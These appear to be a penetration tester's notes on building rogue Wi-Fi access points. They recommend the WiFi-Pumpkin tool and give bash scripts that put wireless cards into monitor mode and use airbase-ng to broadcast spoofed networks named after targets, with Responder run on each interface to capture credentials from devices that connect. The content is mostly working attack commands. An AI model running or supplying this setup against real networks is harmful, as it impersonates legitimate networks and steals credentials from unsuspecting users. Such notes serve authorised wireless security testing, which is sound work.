## Rogue APs

##### Single AP

```
Troubleshooting Notes:
1) When connecting an alfa card make sure it is connected properly to the VM. This can be performed by browsing to 
VM---->Removable Devices----->(Device Name)---->Connect
If still having issues go to the top right of kali (WiFi properties) and turn on the adapter
Also make sure the Kali VM is in bridged mode
If still having issues after that just keep restarting and/or unplugging and plugging in the alfa card
```

The easiest way to setup a rogue AP that has the most functionality if the wifi-pumpkin.

[https://github.com/P0cL4bs/WiFi-Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin)

This tool has the most functionality that I have come across and is the easiest to use interface short of using a wifi pinneaple. It even includes the ability to setup responder on an interface. As of Nov 2018 a beta version of 8.7 included the ability to performed KARMA attacks but I have been unsuccessful to get it to work. Hopefully, future versions will include this ability in a stable manner.

##### Multiple APs

Unfortunately, Wifi-Pumpkin is not currently capable of setting up across multiple interfaces. Even starting two instances interfere with functionality. The following method is what I used to setup multiple APs from a single host that has responder running on each interface.

**First Interface**

```
#!/usr/bin/env bash
airmon-ng check kill
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up

airbase-ng -a XX:XX:XX:XX:XX:XX --essid "TARGET1" -c 6 wlan0
```

In a new terminal tab

```
responder -I wlan0
```

**Second Interface**

```
#!/usr/bin/env bash
#airmon-ng check kill
ifconfig wlan1 down
iwconfig wlan1 mode monitor
ifconfig wlan1 up

airbase-ng -a XX:XX:XX:XX:XX:XX --essid "TARGET2" -c 6 wlan1
```

In a new terminal tab

```
responder -I wlan1
```



